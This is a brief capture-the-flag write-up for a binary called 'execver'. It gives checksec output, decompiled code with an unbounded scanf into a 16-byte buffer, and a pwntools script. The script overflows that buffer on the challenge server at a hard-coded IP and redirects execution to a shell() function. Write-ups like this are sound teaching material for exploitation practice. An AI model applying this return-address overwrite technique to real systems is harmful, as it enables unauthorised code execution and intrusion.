# Execver

##  Checksec
```sh
❯ checksec execver
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

## Reverse Analysis

```c
int main(void)

{
  int check;
  char input [16];
  char vuln_buf [16];
  
  scanf("%[^A-Za-z0-9_]",vuln_buf);
  scanf("%16s",input);
  check = strcmp(input,"shellisntthatcheap");
  if (check == 0) {
    shell();
  }
  return 0;
}
```

## Vulnerability

The vulnerability in this code is a buffer overflow. 
The `scanf` function reads user input into the `vuln_buf` array without proper bounds checking, 
allowing an attacker to overflow the buffer and potentially overwrite adjacent memory, 
including the return address of the function. This can lead to arbitrary code execution if the attacker can control the input.

## Exploit

```python
#!/usr/bin/python
from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51002)
shell_addr = 0x004005B6
buf_len = 16
rbp_len = 8
r.sendline(b"+" * (buf_len + rbp_len) + p64(shell_addr))
r.interactive()
```
